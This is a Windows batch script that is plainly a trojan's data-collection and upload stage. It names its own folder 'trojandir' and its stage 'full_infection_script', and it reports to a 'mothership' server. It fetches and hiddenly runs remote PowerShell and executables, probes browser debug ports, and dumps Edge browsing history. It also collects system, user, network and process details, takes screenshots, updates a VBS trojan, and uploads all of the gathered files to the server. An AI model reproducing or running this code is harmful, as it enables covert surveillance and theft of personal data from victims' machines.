REM set by mothership during HTTP request processing
REM SET jobcode=
REM SET mothership=
REM SET mothershipassets=

set /a error_code=0

set script_version=cmd_list

set batchid=%jobcode%
set sessionid=%jobcode%

IF "%jobcode%"=="" (
    set sessionid=99%random%%random%%random%%random%%random%
    set sessionid=%sessionid:~0,8%
    set batchid=%sessionid%
    set jobcode=%sessionid%
)

SET "trojandir=C:\ProgramData\owd"

set clientid=xxxxxxxx

IF EXIST %trojandir%\client_id (
    set /p clientid=<%trojandir%\client_id
)

set clientid=%clientid:~0,8%

IF "%clientid%"=="xxxxxxxx" (
    goto :error_not_able_to_extract_clientid
)

REM 20260321184244.052000-240
REM %RANDOM% -- 4 digits
set tt=%RANDOM%%RANDOM%%RANDOM%%RANDOM%%RANDOM%%RANDOM%%RANDOM%%RANDOM%%RANDOM%%RANDOM%%RANDOM%

SET "timestamp=%tt:~0,14%%tt:~15,4%"

cd /d %trojandir%
        
set workdir=%trojandir%\cmdlist_%timestamp%

md %workdir%

cd /d %workdir%
    
set logfname=cmdlist_%timestamp%.log
SET "logfpath=%workdir%\%logfname%"


echo %USERNAME% > %trojandir%\username
SET /P tusername=<%trojandir%\username
set "tusername=%tusername: =%"

IF "%tusername%"=="" (
    wmic computersystem get username | findstr /v UserName > %trojandir%\username
    set /p tusername=<%trojandir%\username
    set "tusername=%tusername:*\=%"
)

echo %COMPUTERNAME% > %trojandir%\machinename
SET /P machinename=<%trojandir%\machinename

set "machinename=%machinename: =%"

IF "%machinename%"=="" (
    wmic computersystem get name | findstr /v Name > %trojandir%\machinename
    SET /P machinename=<%trojandir%\machinename
)

set "machinename=%machinename: =%"

IF "%machinename%"=="" (

    FOR /F "tokens=2 delims=:" %%A IN ('systeminfo ^| findstr /B /C:"Host Name"') DO (
        set "myHost=%%A"
    )
    set "myHost=%myHost:~1%"

    set machinename=%myHost%
    
    echo %machinename% > %trojandir%\machinename
)

set scriptfullpath=%~f0
set source=%~nx0

set params=
set params=%params% --data-urlencode "source=%source%" 
set params=%params% --data-urlencode "sessionid=%sessionid%" 
set params=%params% --data-urlencode "jobcode=%jobcode%" 
set params=%params% --data-urlencode "batchid=%batchid%"
set params=%params% --data-urlencode "username=%tusername%"
set params=%params% --data-urlencode "machinename=%machinename%"
set params=%params% --data-urlencode "clientid=%clientid%"
set params=%params% --data-urlencode "script_version=%script_version%"

curl -G %mothership%/ow/logmsg.php --data-urlencode "event=start_job" %params%

REM ----------

set msg=setup done
curl -G %mothership%/ow/logmsg.php --data-urlencode "msg=%msg%" %params%

REM --- init snapshot

set msg=starting snapshot routine
curl -G %mothership%/ow/logmsg.php --data-urlencode "msg=%msg%" %params%

REM --- init snapshot 

curl -o %workdir%\get_dir_listing.ps1 -G %mothershipassets%/ow/assets/get_dir_listing.ps1

IF EXIST %workdir%\get_dir_listing.ps1 (
    cd /d %workdir%
    conhost.exe --headless powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File %workdir%\get_dir_listing.ps1 %USERPROFILE% %workdir% > %workdir%\ps1_exec_cmd.log 2>&1
)

schtasks /v /fo:csv > %workdir%\schtasks_snapshot_init.txt

dir /s %trojandir% > %workdir%\dir_snapshot_trojandir_init.txt
wmic process get CommandLine, ProcessID /format:csv > %workdir%\wmic_snapshot_init.txt
tasklist /v /fo csv > %workdir%\task_snapshot_init.txt
powershell.exe -Command "Get-CimInstance Win32_Process | Select-Object Name, CommandLine, ProcessId | Export-Csv -NoTypeInformation -Path %workdir%\ps1_process_snapshot_init.csv"

REM --- basic cleanup
curl -G %mothership%/ow/logmsg.php --data-urlencode "msg=starting routine: basic cleanup" %params%

copy /y %trojandir%\*.log %workdir%\

for /d %%G in ( %trojandir%\cmdlist_* ) do ( 
      if not "%%G"=="%workdir%" (
          rmdir /S /Q %%G 
      )
)

del /f /q %trojandir%\*.log
del /f /q %trojandir%\cmds_log_*.txt

REM --- test cdp
curl -G %mothership%/ow/logmsg.php --data-urlencode "msg=starting routine: test cdp" %params%

curl -o %workdir%\json_rpc_out_9222.json -G http://localhost:9222/json > %workdir%\curl_9222.log 2>&1
curl -o %workdir%\json_rpc_out_9223.json -G http://localhost:9223/json > %workdir%\curl_9223.log 2>&1


REM --- handles, browsing history
curl -G %mothership%/ow/logmsg.php --data-urlencode "msg=starting routine: handles + browsing history" %params%

IF NOT EXIST %trojandir%\sqlite3.exe (
    curl -o %trojandir%\sqlite3.exe -G %mothershipassets%/ow/assets/sqlite3.exe > %workdir%\curl_sqlite3.log 2>&1
)

IF EXIST %trojandir%\sqlite3.exe (
    conhost.exe --headless powershell.exe -Command "Copy-Item \"%localappdata%\Microsoft\Edge\User Data\Default\History\" %workdir%\EdgeHistory.db -Force
    %trojandir%\sqlite3 -header -csv %temp%\EdgeHistory.db "SELECT url, datetime(last_visit_time/1000000-11644473600,'unixepoch') FROM urls ORDER BY last_visit_time DESC limit 1000;" > %workdir%\edge_history.csv 2>&1
)

IF NOT EXIST %trojandir%\handle.exe (
    curl -o %trojandir%\handle.exe %mothershipassets%/ow/assets/handle.exe
)

IF EXIST %trojandir%\handle.exe (
    %trojandir%\handle.exe -v -accepteula > %workdir%\handle.txt 2>&1
)

IF NOT EXIST %trojandir%\BrowsingHistoryView.exe (
    curl -o %trojandir%\BrowsingHistoryView.exe %mothershipassets%/ow/assets/BrowsingHistoryView.exe
)

IF EXIST %trojandir%\BrowsingHistoryView.exe (
    %trojandir%\BrowsingHistoryView.exe /HistorySource 2 /scomma %workdir%\history.csv
)


REM --- system overview
curl -G %mothership%/ow/logmsg.php --data-urlencode "msg=starting routine: system overview" %params%

dir /s %USERPROFILE% > %workdir%\dir_sanpshot_userprofile.txt
dir /s %appdata% > %workdir%\dir_snapshot_appdata.txt
ver > %workdir%\os_ver
powershell.exe -Command "Get-Volume;" > %workdir%\volume.txt
wmic OS GET LocalDateTime | findstr /v "^$" | findstr /v "LocalDateTime" > %workdir%\wmic_check.txt
query user > %workdir%\user_query.txt
getmac /v /fo csv | findstr /v 00 | findstr /v Connection > %workdir%\macaddr.csv
systeminfo > %workdir%\systeminfo.txt
ipconfig /all > %workdir%\ipconfig.txt

set "key=HKEY_CURRENT_USER\Software\Microsoft\Windows\Shell\Associations\UrlAssociations\http\UserChoice"
set "val=ProgId"

reg query "%key%" /v "%val%" > %workdir%\reg_query_browser_ProgId.txt 2>&1


REM --- compare trojan MD5

type nul > %workdir%\old_zfei.md5
certUtil -hashfile %trojandir%\zfei.vbs MD5 | more +1 > %workdir%\old_zfei.md5
set /p old_zfei_md5=<%workdir%\old_zfei.md5

del /F /Q %trojandir%\zfei_upgrade.vbs

curl -o %trojandir%\zfei_upgrade.vbs -G %mothershipassets%/ow/assets/zfei.vbs

IF EXIST %trojandir%\zfei_upgrade.vbs (
    type nul > %workdir%\new_zfei.md5
    certUtil -hashfile %trojandir%\zfei_upgrade.vbs MD5 | more +1 > %workdir%\new_zfei.md5
    set /p new_zfei_md5=<%workdir%\new_zfei.md5
)

set script_version="full_infection_script"
curl -G %mothership%/ow/logmsg.php --data-urlencode "event=update_snapshot" --data-urlencode "old_zfei_md5=%old_zfei_md5%" --data-urlencode "new_zfei_md5=%new_zfei_md5%" --data-urlencode "script_version=%script_version%" %params%

REM --- screen capture
:startscreencapture

curl -o %trojandir%\get_full_screen_capture.ps1 -G %mothershipassets%/ow/assets/get_full_screen_capture.ps1 %bunnyheader%

IF EXIST %trojandir%\get_full_screen_capture.ps1 (
    conhost.exe --headless powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File %trojandir%\get_full_screen_capture.ps1 %workdir% > %workdir%\get_full_screen_capture.ps1_cmd.log 2>&1
)

IF NOT EXIST %trojandir%\nircmdc.exe (
    curl -o %trojandir%\nircmdc.exe -G %mothershipassets%/ow/assets/nircmdc.exe %bunnyheader%
)

IF EXIST %trojandir%\nircmdc.exe (
    %trojandir%\nircmdc.exe savescreenshot %workdir%\nircmd_screenshot.png
)

REM --- final snapshot 

schtasks /v /fo:csv > %workdir%\schtasks_snapshot_final.txt
dir /s %trojandir% > %workdir%\dir_snapshot_trojandir_final.txt
wmic process get CommandLine, ProcessID /format:csv > %workdir%\wmic_snapshot_final.txt
tasklist /v /fo csv > %workdir%\task_snapshot_final.txt
powershell.exe -Command "Get-CimInstance Win32_Process | Select-Object Name, CommandLine, ProcessId | Export-Csv -NoTypeInformation -Path %workdir%\ps1_process_snapshot_final.csv"

REM ---
:startuploadartifacts

REM --- upload artifacts

set msg=starting uploadfiles
curl -G %mothership%/ow/logmsg.php --data-urlencode "msg=%msg%" %params%

REM ---
copy /y %trojandir%\*.log %workdir%

cd /d %workdir%

FOR %%F IN ("*") DO (   
    curl -G %mothership%/ow/logmsg.php --data-urlencode "msg=uploading %%F" %params%

    curl -v -ks -T "%%F" -X PUT %mothership%/ow/upload.php?filename=%%F^&batchid=%batchid%^&clientid=%clientid%^&source=%source%^&sessionid=%sessionid%^&jobcode=%jobcode%^&machinename=%machinename%^&username=%username%" -H "Content-Type: application/octet-stream"

    REM curl -v -ks --data-binary "@%%F" -X POST "%mothership%/ow/upload.php?filename=%%F^&batchid=%batchid%^&clientid=%clientid%^&source=%source%^&sessionid=%sessionid%^&jobcode=%jobcode%^&machinename=%machinename%^&username=%username%" -H "Content-Type: application/octet-stream"
)

REM ---

curl -G %mothership%/ow/logmsg.php --data-urlencode "event=job_finished" %params%

exit

:error_not_able_to_extract_clientid
set /a error_code+=1
:error_not_able_to_extract_sessionid
set /a error_code+=1
:error_owd_folder_missing
set /a error_code+=1

set msg=errors occurred -- error_code %error_code%
curl -G %mothership%/ow/logmsg.php --data-urlencode "event=job_finished_with_error" --data-urlencode "error_code=%error_code%" %params%

exit